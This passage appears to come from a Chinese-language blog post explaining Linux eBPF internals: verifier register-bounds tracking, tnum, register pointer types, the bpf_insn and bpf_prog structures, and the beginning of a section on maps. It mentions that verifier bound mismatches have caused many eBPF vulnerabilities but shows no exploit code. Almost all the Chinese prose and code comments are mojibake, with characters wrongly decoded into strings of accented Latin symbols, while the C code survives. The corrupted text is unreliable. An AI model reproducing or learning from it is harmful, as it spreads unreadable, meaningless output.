class="hljs-comment"> * These refer to the same value as var_off, not necessarily the actual</span><br><span class="hljs-comment"> * contents of the register.</span><br><span class="hljs-comment"> */</span><br>s64 smin_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (s64) */</span><br>s64 smax_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (s64) */</span><br>u64 umin_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (u64) */</span><br>u64 umax_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (u64) */</span><br>s32 s32_min_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (s32) */</span><br>s32 s32_max_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (s32) */</span><br>u32 u32_min_value; <span class="hljs-comment">/* æœ€å°å¯èƒ½å€¼ (u32) */</span><br>u32 u32_max_value; <span class="hljs-comment">/* æœ€å¤§å¯èƒ½å€¼ (u32) */</span><br><span class="hljs-comment">/* å¯¹äº PTR_TO_PACKET, ç”¨ä»¥æ‰¾åˆ°æœ‰ç€ç›¸åŒå˜é‡åç§»çš„å…¶ä»–æŒ‡é’ˆï¼Œ</span><br><span class="hljs-comment"> * ç”±æ­¤ä»–ä»¬å¯ä»¥å…±äº«èŒƒå›´ä¿¡æ¯.</span><br><span class="hljs-comment"> * å¯¹äº PTR_TO_MAP_VALUE_OR_NULL å…¶è¢«ç”¨äºå…±äº«æˆ‘ä»¬æ¥è‡ªå“ªä¸€ä¸ªæ˜ å°„å€¼</span><br><span class="hljs-comment"> * å½“å…¶ä¸€è¢«æµ‹è¯•äº != NULL.</span><br><span class="hljs-comment"> * å¯¹äº PTR_TO_MEM_OR_NULL å…¶è¢«ç”¨äºè¾¨è¯†å†…å­˜åˆ†é…ä»¥è¿½è¸ªå…¶é‡Šæ”¾.</span><br><span class="hljs-comment"> * å¯¹äº PTR_TO_SOCKET å…¶è¢«ç”¨äºå…±äº«å“ªä¸€ä¸ªæŒ‡é’ˆä¿ç•™äº†å¯¹ socket çš„ç›¸åŒå¼•ç”¨ï¼Œ</span><br><span class="hljs-comment"> * ä»¥ç¡®å®šåˆé€‚çš„å¼•ç”¨é‡Šæ”¾.</span><br><span class="hljs-comment"> * å¯¹äºä½œä¸º dynptrs çš„ stack slots, å…¶è¢«ç”¨äºè¿½è¸ªå¯¹ dynptrçš„å¼•ç”¨</span><br><span class="hljs-comment"> * ä»¥ç¡®å®šåˆé€‚çš„å¼•ç”¨é‡Šæ”¾.</span><br><span class="hljs-comment"> */</span><br>u32 id;<br><span class="hljs-comment">/* PTR_TO_SOCKET ä¸ PTR_TO_TCP_SOCK å¯ä»¥ä¸ºä¸€ä¸ªè¿”å›è‡ªä¸€ä¸ª pointer-cast helper</span><br><span class="hljs-comment"> * bpf_sk_fullsock() ä¸ bpf_tcp_sock() çš„æŒ‡é’ˆ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è€ƒè™‘å¦‚ä¸‹æƒ…å†µï¼Œ &quot;sk&quot; ä¸ºä¸€ä¸ªè¿”å›è‡ª &quot;sk = bpf_sk_lookup_tcp();&quot; çš„å¼•ç”¨è®¡æ•°æŒ‡é’ˆ:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1: sk = bpf_sk_lookup_tcp();</span><br><span class="hljs-comment"> * 2: if (!sk) &#123; return 0; &#125;</span><br><span class="hljs-comment"> * 3: fullsock = bpf_sk_fullsock(sk);</span><br><span class="hljs-comment"> * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 5: tp = bpf_tcp_sock(fullsock);</span><br><span class="hljs-comment"> * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 7: bpf_sk_release(sk);</span><br><span class="hljs-comment"> * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier å°†æŠ—è®®</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ç¬¬ 7 è¡Œçš„ bpf_sk_release(sk) ä¹‹å, &quot;fullsock&quot; æŒ‡é’ˆä¸</span><br><span class="hljs-comment"> * &quot;tp&quot; æŒ‡é’ˆéƒ½åº”å½“è¢«æ— æ•ˆåŒ–.  ä¸ºäº†è¿™ä¹ˆåš, ä¿å­˜ &quot;fullsock&quot; ä¸ &quot;sk&quot;</span><br><span class="hljs-comment"> * çš„å¯„å­˜å™¨éœ€è¦è®°ä½åœ¨ ref_obj_id ä¸­çš„åŸå§‹å¼•ç”¨è®¡æ•°æŒ‡é’ˆ id(å³ï¼Œ sk_reg-&gt;id)</span><br><span class="hljs-comment"> * è¿™æ · verifier ä¾¿èƒ½é‡ç½®æ‰€æœ‰ ref_obj_id åŒ¹é… sk_reg-&gt;id çš„å¯„å­˜å™¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * sk_reg-&gt;ref_obj_id åœ¨ç¬¬ 1 è¡Œè¢«è®¾ä¸º sk_reg-&gt;id.</span><br><span class="hljs-comment"> * sk_reg-&gt;id å°†ä»…ä½œä¸º NULL-marking çš„ç›®çš„ä¿æŒ.</span><br><span class="hljs-comment"> * åœ¨ NULL-marking å®Œæˆå, sk_reg-&gt;id å¯ä»¥è¢«é‡ç½®ä¸º 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ç¬¬ 3 è¡Œçš„ &quot;fullsock = bpf_sk_fullsock(sk);&quot; ä¹‹å,</span><br><span class="hljs-comment"> * fullsock_reg-&gt;ref_obj_id è¢«è®¾ä¸º sk_reg-&gt;ref_obj_id.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ç¬¬ 5 è¡Œçš„ &quot;tp = bpf_tcp_sock(fullsock);&quot; ä¹‹å,</span><br><span class="hljs-comment"> * tp_reg-&gt;ref_obj_id è¢«è®¾ä¸º fullsock_reg-&gt;ref_obj_id</span><br><span class="hljs-comment"> * ä¸ sk_reg-&gt;ref_obj_id ä¸€è‡´.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä» verifier çš„è§’åº¦è€Œè¨€, è‹¥ sk, fullsock ä¸ tp éƒ½é NULL,</span><br><span class="hljs-comment"> * ä»–ä»¬ä¸ºæœ‰ç€ä¸åŒ reg-&gt;type çš„ç›¸åŒæŒ‡é’ˆ.</span><br><span class="hljs-comment"> * ç‰¹åˆ«åœ°, bpf_sk_release(tp) ä¹Ÿè¢«å…è®¸ä¸”æœ‰ç€ä¸ bpf_sk_release(sk) </span><br><span class="hljs-comment"> * ç›¸åŒçš„å½±å“.</span><br><span class="hljs-comment"> */</span><br>u32 ref_obj_id;<br><span class="hljs-comment">/* ç”¨äºå­˜æ´»æ£€æŸ¥çš„äº²å­é“¾ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">parent</span>;</span><br><span class="hljs-comment">/* åœ¨è¢«è°ƒç”¨æ–¹ä¸­ä¸¤ä¸ªå¯„å­˜å™¨å¯ä»¥åŒæ—¶ä¸º PTR_TO_STACK å¦‚åŒ R1=fp-8 ä¸ R2=fp-8,</span><br><span class="hljs-comment"> * ä½†å…¶ä¸€æŒ‡å‘è¯¥å‡½æ•°æ ˆè€Œå¦ä¸€æŒ‡å‘è°ƒç”¨æ–¹çš„æ ˆ. ä¸ºäº†åŒºåˆ†ä»–ä»¬ &#x27;frameno&#x27; è¢«ä½¿ç”¨ï¼Œ</span><br><span class="hljs-comment"> * å…¶ä¸ºä¸€ä¸ªæŒ‡å‘ bpf_func_state çš„ bpf_verifier_state-&gt;frame[] æ•°ç»„ä¸­çš„ä¸‹æ ‡.</span><br><span class="hljs-comment"> */</span><br>u32 frameno;<br><span class="hljs-comment">/* è¿½è¸ªå­å¯„å­˜å™¨ï¼ˆsubregï¼‰å®šä¹‰. ä¿å­˜çš„å€¼ä¸ºå†™å…¥ insn çš„ insn_idx.</span><br><span class="hljs-comment"> * è¿™æ˜¯å®‰å…¨çš„å› ä¸º subreg_def åœ¨ä»»ä½•ä»…åœ¨ä¸»æ ¡éªŒç»“æŸåå‘ç”Ÿçš„ insn ä¿®è¡¥å‰è¢«ä½¿ç”¨.</span><br><span class="hljs-comment"> */</span><br>s32 subreg_def;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_liveness</span> <span class="hljs-title">live</span>;</span><br><span class="hljs-comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span><br><span class="hljs-type">bool</span> precise;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ"><a href="#å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ" class="headerlink" title="å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ"></a>å¯„å­˜å™¨è¿è¡Œæ—¶å€¼ä¸è¾¹ç•ŒèŒƒå›´æ ¡éªŒ</h4><p>eBPF ç¨‹åºçš„å®‰å…¨ä¸»è¦æ˜¯ç”± verifier ä¿è¯çš„ï¼Œverifier ä¼š<strong>æ¨¡æ‹Ÿæ‰§è¡Œæ¯ä¸€æ¡æŒ‡ä»¤</strong>å¹¶éªŒè¯å¯„å­˜å™¨çš„å€¼æ˜¯å¦åˆæ³•ï¼Œä¸»è¦å…³æ³¨è¿™å‡ ä¸ªå­—æ®µï¼š</p><ul><li><code>smin_value</code>ã€<code>smax_value</code>ï¼š 64 ä½æœ‰ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li><li><code>umin_value</code>ã€<code>umax_value</code>ï¼š64 ä½æ— ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li><li><code>s32_min_value</code>ã€<code>s32_max_value</code>ï¼š32 ä½æœ‰ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li><li><code>u32_min_value</code>ã€<code>u32_max_value</code>ï¼š32 ä½æ— ç¬¦å·çš„å€¼çš„å¯èƒ½å–å€¼è¾¹ç•Œ</li></ul><p>è€Œå¯„å­˜å™¨ä¸­<strong>å¯ä»¥ç¡®å®šçš„å€¼</strong>å®é™…ä¸Šé€šè¿‡ <code>var_off</code> å­—æ®µè¿›è¡Œè¡¨ç¤ºï¼Œè¯¥å€¼ç”¨ä¸€ä¸ª <code>tnum</code> ç»“æ„ä½“è¡¨ç¤ºï¼Œ<strong>mask ä¸­ä¸º 0 å¯¹åº”çš„ value ä½ä¸ºå·²çŸ¥ä½</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> &#123;</span><br>u64 value;<br>u64 mask;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ª verifier å®Œå…¨æœªçŸ¥çš„å¯„å­˜å™¨å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">tnum_unknown</span> =</span> &#123; .value = <span class="hljs-number">0</span>, .mask = <span class="hljs-number">-1</span> &#125;;<br></code></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯å¯„å­˜å™¨è¾¹ç•Œå€¼æ˜¯ verifier é€šè¿‡æ¨¡æ‹Ÿæ‰§è¡Œæ¨æµ‹å‡ºæ¥çš„ï¼Œ<strong>è¿è¡Œæ—¶çš„å¯„å­˜å™¨å€¼ä¸ä¸€å®šä¸ verifier æ‰€æ¨æµ‹çš„ä¸€è‡´</strong>ï¼Œè¿™ä¹Ÿæ›¾æ˜¯å¾ˆå¤š eBPF æ¼æ´äº§ç”Ÿçš„åŸå› </p></blockquote><h4 id="å¯„å­˜å™¨ç±»å‹"><a href="#å¯„å­˜å™¨ç±»å‹" class="headerlink" title="å¯„å­˜å™¨ç±»å‹"></a>å¯„å­˜å™¨ç±»å‹</h4><p>å¯„å­˜å™¨åœ¨ç¨‹åºè¿è¡Œçš„ä¸åŒé˜¶æ®µå¯èƒ½å­˜æ”¾ç€ä¸åŒç±»å‹çš„å€¼ï¼Œverifier é€šè¿‡è·Ÿè¸ªå¯„å­˜å™¨å€¼çš„ç±»å‹æ¥é˜²æ­¢è¶Šç•Œè®¿é—®çš„å‘ç”Ÿï¼Œä¸»è¦æœ‰ä¸‰ç±»ï¼š</p><ul><li>æœªåˆå§‹åŒ–ï¼ˆnot initï¼‰ï¼šå¯„å­˜å™¨çš„åˆå§‹çŠ¶æ€ï¼Œå°šæœªç»è¿‡ä»»ä½•èµ‹å€¼æ“ä½œï¼Œæ­¤ç±»å¯„å­˜å™¨ä¸èƒ½å‚ä¸è¿ç®—</li><li>æ ‡é‡å€¼ï¼ˆscalarï¼‰ï¼šè¯¥å¯„å­˜å™¨è¢«èµ‹äºˆäº†æ•´å‹å€¼ï¼Œæ­¤ç±»å¯„å­˜å™¨ä¸èƒ½è¢«ä½œä¸ºæŒ‡é’ˆè¿›è¡Œå†…å­˜è®¿é—®</li><li>æŒ‡é’ˆç±»å‹ï¼ˆpointerï¼‰ï¼šè¯¥å¯„å­˜å™¨ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼Œverifier ä¼šæ£€æŸ¥å†…å­˜è®¿é—®æ˜¯å¦è¶…å‡ºæŒ‡é’ˆå…è®¸çš„èŒƒå›´<ul><li>å®é™…ä¸Š eBPF æŒ‰ç…§ç”¨é€”çš„ä¸åŒåˆ’åˆ†å¤šä¸ªä¸åŒçš„æŒ‡é’ˆç±»å‹ï¼Œä¾‹å¦‚æŒ‡å‘æ ˆçš„æŒ‡é’ˆä¸º <code>PTR_TO_STACK</code> ç±»å‹</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* types of values stored in eBPF registers */</span><br><span class="hljs-comment">/* Pointer types represent:</span><br><span class="hljs-comment"> * pointer</span><br><span class="hljs-comment"> * pointer + imm</span><br><span class="hljs-comment"> * pointer + (u16) var</span><br><span class="hljs-comment"> * pointer + (u16) var + imm</span><br><span class="hljs-comment"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access</span><br><span class="hljs-comment"> * if (id &gt; 0) means that some &#x27;var&#x27; was added</span><br><span class="hljs-comment"> * if (off &gt; 0) means that &#x27;imm&#x27; was added</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> &#123;</span><br>NOT_INIT = <span class="hljs-number">0</span>, <span class="hljs-comment">/* nothing was written into register */</span><br>SCALAR_VALUE, <span class="hljs-comment">/* reg doesn&#x27;t contain a valid pointer */</span><br>PTR_TO_CTX, <span class="hljs-comment">/* reg points to bpf_context */</span><br>CONST_PTR_TO_MAP, <span class="hljs-comment">/* reg points to struct bpf_map */</span><br>PTR_TO_MAP_VALUE, <span class="hljs-comment">/* reg points to map element value */</span><br>PTR_TO_MAP_VALUE_OR_NULL,<span class="hljs-comment">/* points to map elem value or NULL */</span><br>PTR_TO_STACK, <span class="hljs-comment">/* reg == frame_pointer + offset */</span><br>PTR_TO_PACKET_META, <span class="hljs-comment">/* skb-&gt;data - meta_len */</span><br>PTR_TO_PACKET, <span class="hljs-comment">/* reg points to skb-&gt;data */</span><br>PTR_TO_PACKET_END, <span class="hljs-comment">/* skb-&gt;data + headlen */</span><br>PTR_TO_FLOW_KEYS, <span class="hljs-comment">/* reg points to bpf_flow_keys */</span><br>PTR_TO_SOCKET, <span class="hljs-comment">/* reg points to struct bpf_sock */</span><br>PTR_TO_SOCKET_OR_NULL, <span class="hljs-comment">/* reg points to struct bpf_sock or NULL */</span><br>PTR_TO_SOCK_COMMON, <span class="hljs-comment">/* reg points to sock_common */</span><br>PTR_TO_SOCK_COMMON_OR_NULL, <span class="hljs-comment">/* reg points to sock_common or NULL */</span><br>PTR_TO_TCP_SOCK, <span class="hljs-comment">/* reg points to struct tcp_sock */</span><br>PTR_TO_TCP_SOCK_OR_NULL, <span class="hljs-comment">/* reg points to struct tcp_sock or NULL */</span><br>PTR_TO_TP_BUFFER, <span class="hljs-comment">/* reg points to a writable raw tp&#x27;s buffer */</span><br>PTR_TO_XDP_SOCK, <span class="hljs-comment">/* reg points to struct xdp_sock */</span><br><span class="hljs-comment">/* PTR_TO_BTF_ID points to a kernel struct that does not need</span><br><span class="hljs-comment"> * to be null checked by the BPF program. This does not imply the</span><br><span class="hljs-comment"> * pointer is _not_ null and in practice this can easily be a null</span><br><span class="hljs-comment"> * pointer when reading pointer chains. The assumption is program</span><br><span class="hljs-comment"> * context will handle null pointer dereference typically via fault</span><br><span class="hljs-comment"> * handling. The verifier must keep this in mind and can make no</span><br><span class="hljs-comment"> * assumptions about null or non-null when doing branch analysis.</span><br><span class="hljs-comment"> * Further, when passed into helpers the helpers can not, without</span><br><span class="hljs-comment"> * additional context, assume the value is non-null.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID,<br><span class="hljs-comment">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span><br><span class="hljs-comment"> * been checked for null. Used primarily to inform the verifier</span><br><span class="hljs-comment"> * an explicit null check is required for this struct.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID_OR_NULL,<br>PTR_TO_MEM, <span class="hljs-comment">/* reg points to valid memory region */</span><br>PTR_TO_MEM_OR_NULL, <span class="hljs-comment">/* reg points to valid memory region or NULL */</span><br>PTR_TO_RDONLY_BUF, <span class="hljs-comment">/* reg points to a readonly buffer */</span><br>PTR_TO_RDONLY_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a readonly buffer or NULL */</span><br>PTR_TO_RDWR_BUF, <span class="hljs-comment">/* reg points to a read/write buffer */</span><br>PTR_TO_RDWR_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a read/write buffer or NULL */</span><br>PTR_TO_PERCPU_BTF_ID, <span class="hljs-comment">/* reg points to a percpu kernel variable */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="å››ã€eBPF-æŒ‡ä»¤ä¸-eBPF-ç¨‹åº"><a href="#å››ã€eBPF-æŒ‡ä»¤ä¸-eBPF-ç¨‹åº" class="headerlink" title="å››ã€eBPF æŒ‡ä»¤ä¸ eBPF ç¨‹åº"></a>å››ã€eBPF æŒ‡ä»¤ä¸ eBPF ç¨‹åº</h2><p>eBPF ä¸º RISC æŒ‡ä»¤é›†ï¼Œå•æ¡ eBPF æŒ‡ä»¤åœ¨å†…æ ¸ä¸­å®šä¹‰ä¸ºä¸€ä¸ª <code>bpf_insn</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* opcode */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* dest register */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* source register */</span><br>__s16off;<span class="hljs-comment">/* signed offset */</span><br>__s32imm;<span class="hljs-comment">/* signed immediate constant */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ eBPF ç¨‹åº<strong>ä¾¿æ˜¯ä¸€ä¸ª</strong> <code>bpf_insn</code> <strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ€ä¸‹ç¼–å†™å½¢å¦‚è¿™æ ·çš„ç»“æ„ä½“æ•°ç»„æ¥æè¿°ä¸€ä¸ª eBPF ç¨‹åºï¼Œå¹¶ä½œä¸º eBPF ç¨‹åºå­—èŠ‚ç ä¼ å…¥å†…æ ¸ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>è½½å…¥åˆ°å†…æ ¸ä¸­åï¼Œå†…æ ¸æœ€ç»ˆä¼šä½¿ç”¨ä¸€ä¸ª <code>bpf_prog</code> ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ª eBPF ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> &#123;</span><br>u16pages;<span class="hljs-comment">/* åˆ†é…çš„é¡µé¢æ•°é‡ */</span><br>u16jited:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æˆ‘ä»¬çš„ filter æ˜¯å¦æ˜¯å³æ—¶ç¼–è¯‘çš„? */</span><br>jit_requested:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æ¶æ„éœ€è¦å³æ—¶ç¼–è¯‘ç¨‹åº */</span><br>gpl_compatible:<span class="hljs-number">1</span>, <span class="hljs-comment">/* filter æ˜¯å¦å…¼å®¹ GPL? */</span><br>cb_access:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æ§åˆ¶å—è¢«è®¿é—®äº†å—? */</span><br>dst_needed:<span class="hljs-number">1</span>,<span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦éœ€è¦ dst å…¥å£? */</span><br>blinding_requested:<span class="hljs-number">1</span>, <span class="hljs-comment">/* needs constant blinding */</span><span class="hljs-comment">//è¯‘æ³¨ï¼šä¸çŸ¥é“å’‹ç¿»</span><br>blinded:<span class="hljs-number">1</span>,<span class="hljs-comment">/* Was blinded */</span><span class="hljs-comment">//è¯‘æ³¨ï¼šçäº†ï¼Ÿ</span><br>is_func:<span class="hljs-number">1</span>,<span class="hljs-comment">/* ç¨‹åºä¸ºä¸€ä¸ª bpf å‡½æ•° */</span><br>kprobe_override:<span class="hljs-number">1</span>, <span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦åœ¨ä¸€ä¸ª kprobe ä¹‹ä¸Š? */</span><br>has_callchain_buf:<span class="hljs-number">1</span>, <span class="hljs-comment">/* callchain buffer åˆ†é…äº†å—? */</span><br>enforce_expected_attach_type:<span class="hljs-number">1</span>, <span class="hljs-comment">/* åœ¨ attach æ—¶å¼ºåˆ¶æ‰§è¡Œ expected_attach_type æ£€æŸ¥ */</span><br>call_get_stack:<span class="hljs-number">1</span>, <span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦è°ƒç”¨ bpf_get_stack() æˆ– bpf_get_stackid() */</span><br>call_get_func_ip:<span class="hljs-number">1</span>, <span class="hljs-comment">/* æˆ‘ä»¬æ˜¯å¦è°ƒç”¨ get_func_ip() */</span><br>tstamp_type_access:<span class="hljs-number">1</span>; <span class="hljs-comment">/* è¢«è®¿é—®çš„ __sk_buff-&gt;tstamp_type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span><span class="hljs-title">type</span>;</span><span class="hljs-comment">/* BPF ç¨‹åºç±»å‹ */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_attach_type</span><span class="hljs-title">expected_attach_type</span>;</span> <span class="hljs-comment">/* ç”¨äºä¸€äº›ç¨‹åºç±»å‹ */</span><br>u32len;<span class="hljs-comment">/* filter å—çš„æ•°é‡ */</span><br>u32jited_len;<span class="hljs-comment">/* æŒ‰å­—èŠ‚è®¡çš„è¢«å³æ—¶ç¼–è¯‘çš„æŒ‡ä»¤å¤§å° */</span><br>u8tag[BPF_TAG_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_stats</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">stats</span>;</span><br><span class="hljs-type">int</span> __percpu*active;<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span><span class="hljs-params">(*bpf_func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *ctx,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn *insn)</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_aux</span>*<span class="hljs-title">aux</span>;</span><span class="hljs-comment">/* è¾…åŠ©åŸŸ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog_kern</span>*<span class="hljs-title">orig_prog</span>;</span><span class="hljs-comment">/* åŸå§‹ BPF ç¨‹åº */</span><br><span class="hljs-comment">/* ç¿»è¯‘å™¨çš„æŒ‡ä»¤ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> sock_filter, insns);<br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> bpf_insn, insnsi);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>bpf_func</code> å‡½æ•°æŒ‡é’ˆä¾¿æŒ‡å‘ BPF å­—èŠ‚ç ç»è¿‡ JIT ç¼–è¯‘ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å…¥å£ç‚¹</p><h2 id="äº”ã€eBPF-map"><a href="#äº”ã€eBPF-map" class="headerlink" title="äº”ã€eBPF map"></a>äº”ã€eBPF map</h2><p>bpf map æ˜¯ä¸€ä¸ªé€šç”¨çš„ç”¨ä»¥å‚¨å­˜ä¸åŒç§ç±»æ•°æ®çš„ç»“æ„ï¼Œç”¨ä»¥åœ¨ç”¨æˆ·è¿›ç¨‹ä¸ eBPF ç¨‹åºã€eBPF ç¨‹åºä¸ eBPF 